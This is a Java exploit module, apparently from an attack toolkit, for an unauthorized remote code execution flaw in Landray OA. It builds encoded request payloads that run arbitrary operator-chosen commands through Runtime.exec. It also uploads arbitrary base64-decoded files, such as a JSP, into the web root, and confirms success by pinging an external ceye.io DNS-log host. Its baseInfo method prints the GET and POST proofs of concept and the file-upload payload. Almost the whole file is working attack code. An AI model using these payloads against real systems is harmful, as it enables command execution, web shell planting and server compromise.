package com.hello.landray.service;

import com.hello.strategy.ExpStrategy;
import com.hello.tools.net.HttpClient45;
import com.hello.tools.net.listener.FailedListener;
import com.hello.tools.net.listener.SuccessListener;
import org.apache.http.HttpEntity;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class LandrayUnauthorizedRCEService extends ExpStrategy {
    private Boolean isVul = false;
    String uploadPoc = "{import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(\"WEB-INF\")[0]%2B\"/{0}\");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(\"{1}\");fout.close();} catch (IOException e) {System.err.println(e);}";

    String execPoc = "/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"ping -c 4 5hgkr7.ceye.io\")&type=1";
    /**
     * 漏洞uri地址
     */
    ArrayList<String> uriList = new ArrayList<String>() {{
        add("/data/sys-common/treexml.tmpl");
        add("/data/sys-common/datajson.tmpl");
        add("/data/sys-common/datajson.js");
        add("/data/sys-common/dataxml.tmpl");
    }};
    /**
     * 命令执行
     * @param url   url地址，.com域名结束不要带斜线
     * @param cmd   要执行的命令
     * @return
     * @throws Exception
     */
    @Override
    public String exeCMD(String url, String cmd){
        String cmdCode = cmd.replace(" ", "%20");
        StringBuilder result = new StringBuilder();
        //构造漏洞url
        StringBuilder exp = new StringBuilder();
        exp.append("?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22");
        exp.append(cmdCode);
        exp.append("%22)&type=1");
        //设置请求头
        HashMap<String , String> headers = new HashMap<>();
        headers.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400");
        headers.put("Connection","close");
        //多路径命令执行探测
        for (String uri : uriList){
            String s = sendExp(url, uri, exp.toString(), headers);
            result.append(s);
            if(s.contains("命令执行成功")){
                return result.toString();
            }
        }
        return result.toString();
    }

    /**
     * 返回漏洞是否存在
     * @return
     */
    @Override
    public boolean isVul() {
        return this.isVul;
    }

    /**
     * 漏洞检测
     * @param url 待检测url
     * @return
     */
    @Override
    public String checkVul(String url) {
        String result = null;
        result = exeCMD(url, "ping -c 4 5hgkr7.ceye.io");
        return result;
    }

    /**
     * 漏洞基础信息
     * @return
     */
    @Override
    public String baseInfo() {
        StringBuilder vulnInfo = new StringBuilder();
        vulnInfo.append("适用于蓝凌oa任意命令执行\n");
        vulnInfo.append("该命令执行不会有回显，可以借助dnslog等方式外带\n");
        vulnInfo.append("POC1：\n");
        vulnInfo.append("通过GET方式进行探测\n");
        vulnInfo.append("url+?/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"ping -c 4 5hgkr7.ceye.io\")&type=1 \n");
        vulnInfo.append("POC2：\n");
        vulnInfo.append("通过POST方式进行探测\n");
        vulnInfo.append("PATH:\n");
        vulnInfo.append("/data/sys-common/treexml.tmpl\n");
        vulnInfo.append("Body:\n");
        vulnInfo.append("s_bean=ruleFormulaValidate&script=try {String cmd = \"ping {{interactsh-url}}\";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}\n");
        vulnInfo.append("--------------------------------------\n");
        vulnInfo.append("其他路径\n");
        vulnInfo.append("/data/sys-common/treexml.tmpl    \n" +
                "/data/sys-common/datajson.tmpl    \n" +
                "/data/sys-common/dataxml.tmpl\n");
        vulnInfo.append("文件上传POC:\n" +
                "try {\n" +
                "    import java.lang.*;\n" +
                "    import java.io.*;\n" +
                "    Class cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");\n" +
                "    String path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();\n" +
                "    File f=new File(path.split(\"WEB-INF\")[0]/loginx.jsp);\n" +
                "    f.createNewFile();\n" +
                "    FileOutputStream fout=new FileOutputStream(f);\n" +
                "    fout.write(new sun.misc.BASE64Decoder().decodeBuffer(\"aGVsbG8=\"));\n" +
                "    fout.close();\n" +
                "} catch (IOException e)\n" +
                "{\n" +
                "    System.err.println(e);\n" +
                "}");
        return vulnInfo.toString();
    }

    /**
     *
     * @param url 漏洞url
     * @param filename  上传文件名
     * @param fileContent   上传文件内容
     * @return 上传结果
     */
    @Override
    public String uploadFile(String url, String filename, String fileContent) {
        StringBuilder poc = new StringBuilder();
        poc.append("s_bean=ruleFormulaValidate&script=try%20{import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(\"WEB-INF\")[0]%2B\"/");
        poc.append(filename);
        poc.append("\");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(\"");
        poc.append(fileContent);
        poc.append("\"));fout.close();}%20catch%20(IOException%20e)%20{System.err.println(e);}");
        StringBuilder result = new StringBuilder();
        Map<String, String> headers = new HashMap<>();
        headers.put("Pragma","no-cache");
        headers.put("Content-Type","application/x-www-form-urlencoded");
        //对多个路径都尝试文件上传，对每个路径的结果保存在result里面
        for (String uri : uriList) {
            String s = sendUploadExp(url, uri, poc.toString(), headers);
            result.append(s);
            if (s.contains("上传成功")){
                return result.toString();
            }
        }
        return result.toString();
    }

    /**
     * 命令执行
     * @param url 目标url
     * @param uri   漏洞uri
     * @param exp   漏洞exp内容
     * @param headers   请求头
     * @return  执行结果
     */
    private String sendExp(String url,String uri,String exp,Map<String,String> headers){
        StringBuilder stringBuilder = new StringBuilder();
        StringBuilder result = new StringBuilder();
        stringBuilder.append(url);
        stringBuilder.append(uri);
        stringBuilder.append(exp);

        try {
            HttpClient45.get(stringBuilder.toString(), headers, new SuccessListener() {
                @Override
                public void successListener(HttpEntity entity) {
                    String s = null;
                    try {
                        s = EntityUtils.toString(entity);
                        if (s.contains("模拟通过")){
                            isVul = true;
                            result.append("[+]"+url+uri+":命令执行成功\n");
                        }else
                            result.append("[-]"+url+uri+":命令执行失败\n");
                    } catch (IOException e) {
                        result.append("[-]"+url+uri+":请求异常\n");
                        result.append(e.getMessage()+"\n");
                    }
                }
            }, new FailedListener() {
                @Override
                public void failedListener(Exception e) {
                    result.append("[-]"+url+uri+":请求失败\n");
                }
            });
        } catch (IOException e) {
            result.append("[-]"+url+uri+":请求异常\n");
            result.append(e.getMessage()+"\n");
        }
        return result.toString();
    }


    /**
     * 文件上传
     * @param url 目标url
     * @param uri 漏洞uri路径
     * @param exp 漏洞exp内容
     * @param headers 请求头
     * @return 请求结果
     */
    private String sendUploadExp(String url,String uri,String exp,Map<String,String> headers){
        StringBuilder stringBuilder = new StringBuilder();
        StringBuilder result = new StringBuilder();
        stringBuilder.append(url);
        stringBuilder.append(uri);
        try {
            HttpClient45.post(stringBuilder.toString(), headers, exp, new SuccessListener() {
                @Override
                public void successListener(HttpEntity entity) {
                    String s = null;
                    try {
                        s = EntityUtils.toString(entity);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    if (s.contains("<success>true</success>")){
                        result.append(uri+"\n");
                        result.append(":上传成功,默认路径在web站点根目录");
                    }

                }
            }, new FailedListener() {
                @Override
                public void failedListener(Exception e) {
                    result.append(uri);
                    result.append(":上传失败");
                }
            });
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return result.toString();
    }
}
